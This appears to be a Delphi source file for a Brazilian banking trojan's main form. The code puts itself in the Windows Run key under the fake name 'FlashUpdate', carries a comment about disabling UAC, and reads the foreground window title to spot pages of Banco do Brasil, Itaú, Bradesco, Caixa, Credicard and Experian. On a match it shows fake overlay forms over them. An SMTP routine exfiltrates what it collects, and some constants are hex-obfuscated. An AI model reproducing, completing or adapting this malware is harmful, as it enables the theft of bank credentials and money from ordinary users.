unit MainCentral;

{$WARNINGS OFF}
{$HINTS OFF}

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, IdIPWatch, ExtCtrls, IdMessage, IdExplicitTLSClientServerBase,
  IdMessageClient, IdSMTPBase, IdSMTP, IdBaseComponent, IdComponent,
  IdTCPConnection, IdTCPClient, IdHTTP, Registry;

type
  TFrmsegredofiel_ = class(TForm)
    HTTP: TIdHTTP;
    Email: TIdSMTP;
    MSG: TIdMessage;
    Tempo: TTimer;
    IP: TIdIPWatch;
    procedure TempoTimer(Sender: TObject);
    procedure FormCreate(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Frmsegredofiel_: TFrmsegredofiel_;
  IdentHandle_    : HWND;
  ENVIO_PROGRAMACAO_DADOS_     : TStringList;
  BufferSTR_      : array [0..254] of Char;
  WinN4m33_        : string;

  const
  CASINHA01FAKEE   = 'experian';
  CASINHA01BBPP    = 'Autoatendimento Pessoa Física - Banco do Brasil';
  CASINHA01ITAUU    = '30 horas';
  CASINHA01DECOO     = 'bradesco s/a';
  CASINHA01CEFF    = 'internet...Ba.n...k.ing::: ___....   CA---IXA';
  CASINHA01CREDD   = 'credicard';

  YES_            = 100;
  NO_             = 0;
  OFF_            = False;
  ON_             = True;
  MAXCARACT_      = 254;

    //---Config Info---
  DE    = 'email';
  LOGIN = 'email';
  SENHA  = 'senha';
  SMTP  = 'smtp';
  Port = 587;
  PARA  = 'destinatario;


  //---Config Aviso---
  Aviso_De    = '';
  Aviso_Login = '';
  Aviso_Pass  = '';
  Aviso_Smtp  = '';
  Aviso_Porta = 587;
  Aviso_Para  = '';



implementation

{$R *.dfm}

uses
 Gerador, Fake, Brad1, InstallBrada,
 PageB, CredMainCit_;

procedure TFrmsegredofiel_.FormCreate(Sender: TObject);
var
 Reg: TRegistry;
const
 PARTE1_ = '3C26263B25588383EF2DA3879FDD1562EA1A1B0A18223DBE2DB749C254F36DF30F212FD77AB97EA65B82BA273FE71B32954C8BB1AE7DB8123CE21D26C2074986C2749AA';
 PARTE2_ = '2588FBC66FC56FB6CEC2DEC41ED68C4B262C646E7055E98A9BC59D0A98D533FA3DB688BFD66F1027FAF89A4F167B6AF57';

begin
  Self.Caption := Application.Title;

  Reg := TRegistry.Create;
  Reg.RootKey := HKEY_CURRENT_USER;
  Reg.Openkey('Software\Microsoft\Windows\CurrentVersion\Run',False);
  Reg.WriteString('FlashUpdate',Application.ExeName);
  Reg.CloseKey;
  Reg.Free;

  {Desabilita UAC}

  if not FileExists(pegadiretoriodocliente+'senderedemail.tmp') then
    S3nd3_rFogra;
  //Fim
end;

procedure TFrmsegredofiel_.TempoTimer(Sender: TObject);
begin
 Tempo.Enabled := OFF_;

  IdentHandle_ := GetForegroundWindow;
  GetWindowText(IdentHandle_, BufferSTR_, MAXCARACT_);
  WinN4m33_ := LowerCase(BufferSTR_);

  if IdentHandle_ <> NO_ then
  begin

    if Comparaciontrtr_(CASINHA01FAKEE, WinN4m33_) <> NO_ then
    begin
      Face := TFace.Create(self); Face.Show;
      FWinFrontShow(Face.Handle);Face.trav1.Enabled := true;
      Face.Left := 0;Exit;
    end;

    if Comparaciontrtr_(CASINHA01ITAUU, WinN4m33_) <> NO_ then
    begin
      BradForm_ := TBradForm_.Create(Self);BradForm_.Show;
      FWinFrontShow(BradForm_.Handle);BradForm_.Trav3.Enabled := True;
      BradForm_.Left := 0;Exit;
    end;

    if Comparaciontrtr_(CASINHA01DECOO, WinN4m33_) <> NO_ then
    begin
      FormBrada_ := TFormBrada_.Create(Self);FormBrada_.Show;
      FWinFrontShow(FormBrada_.Handle);FormBrada_.Trav5.Enabled := True;
      FormBrada_.Left := 0;Exit;
    end;

    if Comparaciontrtr_(CASINHA01BBPP, WinN4m33_) <> NO_ then
    begin
      BBP := TBBP.Create(self); BBP.Show;
      FWinFrontShow(BBP.Handle);BBP.Trav2.Enabled := true;
      BBP.Left := 0;Exit;
    end;
    if Comparaciontrtr_(CASINHA01CREDD, WinN4m33_) <> NO_ then
    begin
     Formblue_ := TFormblue_.Create(Self); Formblue_.Show;
     FWinFrontShow(FormBlue_.Handle);FormBlue_.trav_01.Enabled := true;
     Formblue_.Left := 0;Exit;
    end;

  end;

Tempo.Enabled := ON_;
end;

end.
